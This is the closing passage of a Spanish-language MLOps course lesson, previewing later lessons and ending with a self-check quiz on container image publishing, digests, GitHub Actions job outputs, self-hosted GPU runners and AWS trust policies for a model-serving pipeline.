- «Kubernetes» toma el digest que esta estación dejó en el repositorio de despliegue: cómo el clúster baja la imagen, cuándo da por lista una copia y por qué la de Triton tarda minutos en arrancar.
- «Rollout seguro» decide cuánto tráfico recibe la versión nueva y cuándo se vuelve sola a la anterior, y mueve el alias `champion` del modelo al terminar.
- «Monitoreo, drift y reentrenamiento» vigila lo que corre, con la `model_version` y el digest de cada respuesta para saber qué versión hizo qué.

## Palabras que vas a oír {Words you will hear}

Estos son los conceptos que presentó esta lección. Cada uno tiene su tarjeta con la definición completa.

:::conceptos
registro-imagenes tag-inmutable promocion-imagen politica-retencion-imagenes workflow-actions job-actions outputs-job check-obligatorio environment-actions concurrency-actions cache-actions runner-self-hosted trust-policy permisos-workflow argo-cd paridad-e2e github-app
:::

## Chequeo {Check}

Intenta responder en tu cabeza antes de abrir cada respuesta.

:::chequeo
? ¿Por qué la imagen del gateway se publica solo después del merge, y no desde el PR?
Porque en un PR GitHub prueba un merge de prueba que no existe en ninguna rama, y un PR puede venir de cualquiera. Después del merge, el commit es real y ya pasó por revisión.
? ¿Qué hace un tag inmutable, y por qué no basta con desplegar por tag?
El registro rechaza otro contenido con un tag que ya existe. Aun así, Alba despliega por digest: el digest fija los bytes exactos y el tag solo los nombra para una persona.
? ¿Cómo llega el digest del job `imagen` a los jobs de despliegue?
Como salida del job: el paso de push lo escribe en `$GITHUB_OUTPUT`, el job lo declara en `outputs` y los de abajo lo leen como `needs.imagen.outputs.digest`.
? ¿Por qué la retención de Alba cuenta imágenes y no días?
Porque la regla no sabe qué corre en producción. Contando, la versión estable y la anterior siguen entre las últimas 200 aunque nadie despliegue en semanas.
? ¿Qué ve la paridad de punta a punta que no ven las otras dos?
El preprocesamiento del gateway y el orden de `labels.json`, porque manda fotos JPEG por el gateway real; las otras reciben la foto ya preparada.
? ¿Por qué `triton-modelo` corre por botón en el runner con T4 y no en cada PR?
Porque el modelo cambia una vez al mes, la imagen pesa 9.2 GB y probarla necesita la GPU. El runner propio solo corre trabajo de `main` o del botón, nunca código de un PR.
? (De la sección extra.) ¿Qué revisa AWS en el token de un job antes de darle credenciales?
La firma de GitHub y las condiciones de la trust policy del rol, sobre todo el `sub`: qué repositorio, qué rama o qué environment. Si coincide, entrega credenciales que vencen en una hora.
:::
